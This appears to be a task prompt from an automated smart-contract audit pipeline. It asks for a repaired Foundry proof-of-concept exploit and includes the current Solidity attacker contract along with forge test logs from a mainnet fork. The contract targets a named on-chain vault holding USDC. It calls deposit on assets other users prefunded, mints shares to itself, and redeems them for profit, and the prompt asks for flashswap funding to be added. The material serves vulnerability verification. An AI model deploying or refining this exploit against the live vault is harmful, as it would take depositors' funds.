You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Anyone can mint vault shares using assets already sitting in the vault
- claim: `deposit` never pulls assets from `msg.sender`. It only checks that the vault already holds at least `assets`, forwards those pre-existing funds to the controller, and then mints shares to an arbitrary `receiver`.
- impact: A caller can steal credit for someone else's prefunded deposit or claim any tokens/ETH accidentally sent to the vault, receiving newly minted shares without contributing assets.
- exploit_paths: ["A victim transfers underlying tokens or ETH to the vault address before calling `deposit`, because the vault has no `transferFrom` step.", "An attacker sees the prefunded balance and calls `deposit(victimAmount, attacker)` first.", "The vault forwards the victim-funded assets to the controller and mints the corresponding vault shares to the attacker."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IWhitelistLike {
    function listed(address account) external returns (bool);
}

interface IEFVaultLike {
    function asset() external view returns (address);
    function whiteList() external view returns (address);
    function maxDeposit() external view returns (uint256);
    function maxWithdraw() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function convertToAssets(uint256 shares) external view returns (uint256);
    function deposit(uint256 assets, address receiver) external returns (uint256);
    function redeem(uint256 shares, address receiver) external returns (uint256);
    function withdraw(uint256 assets, address receiver) external returns (uint256);
}

contract FlawVerifier {
    address internal constant TARGET = 0xBDB515028A6fA6CD1634B5A9651184494aBfD336;

    uint256 internal constant STATUS_UNTRIED = 0;
    uint256 internal constant STATUS_SUCCESS = 1;
    uint256 internal constant STATUS_NO_PREFUND = 2;
    uint256 internal constant STATUS_NOT_WHITELISTED = 3;
    uint256 internal constant STATUS_DEPOSIT_FAILED = 4;
    uint256 internal constant STATUS_NO_SHARES = 5;
    uint256 internal constant STATUS_REDEEM_FAILED = 6;

    uint256 public status;
    bytes public lastError;

    address internal _profitToken;
    uint256 internal _profitAmount;

    constructor() {}

    receive() external payable {}

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        IEFVaultLike vault = IEFVaultLike(TARGET);
        address assetToken = vault.asset();
        _profitToken = assetToken;
        _profitAmount = 0;
        status = STATUS_UNTRIED;
        delete lastError;

        // The vulnerable path requires assets to already be sitting in the vault.
        uint256 prefundedBalance = _vaultAssetBalance(assetToken);
        if (prefundedBalance == 0) {
            // Concrete infeasibility reason for this fork state:
            // there is no pre-existing asset balance at the vault to steal credit for.
            status = STATUS_NO_PREFUND;
            return;
        }

        uint256 maxDeposit = vault.maxDeposit();
        uint256 maxWithdraw = vault.maxWithdraw();

        // The harness enters through this contract, so tx.origin == msg.sender can never satisfy onlyAllowed.
        // Exploitation through executeOnOpportunity() is therefore only possible if this verifier contract is
        // already accepted by the on-chain whitelist at the fork block.
        if (!_isWhitelisted(vault.whiteList(), address(this))) {
            status = STATUS_NOT_WHITELISTED;
            return;
        }

        uint256 balanceBefore = _selfBalance(assetToken);
        for (uint256 i = 0; i < 16; ++i) {
            uint256 remainingPrefund = _vaultAssetBalance(assetToken);
            if (remainingPrefund == 0) {
                break;
            }

            uint256 stolenDepositAmount = remainingPrefund;
            if (stolenDepositAmount > maxDeposit) {
                stolenDepositAmount = maxDeposit;
            }
            if (stolenDepositAmount == 0) {
                break;
            }

            uint256 sharesBefore = vault.balanceOf(address(this));

            // Path stage 1-3: victim funds already sit in the vault, attacker calls deposit(victimAmount, attacker),
            // vault forwards those pre-existing funds to the controller and mints shares to the attacker.
            (bool depositOk, bytes memory depositErr) =
                TARGET.call(abi.encodeWithSelector(IEFVaultLike.deposit.selector, stolenDepositAmount, address(this)));
            if (!depositOk) {
                status = STATUS_DEPOSIT_FAILED;
                lastError = depositErr;
                return;
            }

            uint256 mintedShares = vault.balanceOf(address(this));
            if (mintedShares <= sharesBefore) {
                status = STATUS_NO_SHARES;
                return;
            }

            // Path stage 4: attacker realizes the stolen credit by redeeming the newly minted shares for the
            // underlying asset. If maxWithdraw caps a full redeem, fall back to equivalent chunked withdraws.
            (bool redeemOk, bytes memory redeemErr) =
                TARGET.call(abi.encodeWithSelector(IEFVaultLike.redeem.selector, mintedShares, address(this)));
            if (!redeemOk) {
                if (!_withdrawInChunks(vault, maxWithdraw)) {
                    status = STATUS_REDEEM_FAILED;
                    lastError = redeemErr;
                    return;
                }
            }
        }

        uint256 balanceAfter = _selfBalance(assetToken);
        if (balanceAfter > balanceBefore) {
            _profitAmount = balanceAfter - balanceBefore;
            status = STATUS_SUCCESS;
        } else {
            // Deposit/redeem executed but did not produce positive net underlying.
            status = STATUS_REDEEM_FAILED;
        }
    }

    function _vaultAssetBalance(address assetToken) internal view returns (uint256) {
        if (assetToken == address(0)) {
            return TARGET.balance;
        }
        return IERC20Like(assetToken).balanceOf(TARGET);
    }

    function _selfBalance(address assetToken) internal view returns (uint256) {
        if (assetToken == address(0)) {
            return address(this).balance;
        }
        return IERC20Like(assetToken).balanceOf(address(this));
    }

    function _isWhitelisted(address whitelist, address account) internal returns (bool) {
        if (whitelist == address(0)) {
            return false;
        }

        try IWhitelistLike(whitelist).listed(account) returns (bool allowed) {
            return allowed;
        } catch {
            return false;
        }
    }

    function _withdrawInChunks(IEFVaultLike vault, uint256 maxWithdraw) internal returns (bool) {
        if (maxWithdraw == 0) {
            return false;
        }

        for (uint256 i = 0; i < 32; ++i) {
            uint256 shareBalance = vault.balanceOf(address(this));
            if (shareBalance == 0) {
                return true;
            }

            uint256 remainingAssets = vault.convertToAssets(shareBalance);
            if (remainingAssets == 0) {
                return false;
            }

            uint256 assetsToWithdraw = remainingAssets;
            if (assetsToWithdraw > maxWithdraw) {
                assetsToWithdraw = maxWithdraw;
            }

            (bool ok,) =
                TARGET.call(abi.encodeWithSelector(IEFVaultLike.withdraw.selector, assetsToWithdraw, address(this)));
            if (!ok) {
                return false;
            }
        }

        return vault.balanceOf(address(this)) == 0;
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 1.03s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 112030)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 2186

Traces:
  [112030] FlawVerifierTest::testExploit()
    ├─ [2346] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [72508] FlawVerifier::executeOnOpportunity()
    │   ├─ [9733] 0xBDB515028A6fA6CD1634B5A9651184494aBfD336::asset() [staticcall]
    │   │   ├─ [2405] 0x80cB73074A6965F60DF59BF8fA3CE398Ffa2702c::asset() [delegatecall]
    │   │   │   └─ ← [Return] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
    │   │   └─ ← [Return] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
    │   ├─ [9815] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(0xBDB515028A6fA6CD1634B5A9651184494aBfD336) [staticcall]
    │   │   ├─ [2529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(0xBDB515028A6fA6CD1634B5A9651184494aBfD336) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [346] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
    ├─ [341] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [3315] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   ├─ [2529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 16696239 [1.669e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 2186)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 995.18ms (174.64ms CPU time)

Ran 1 test suite in 1.01s (995.18ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 112030)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
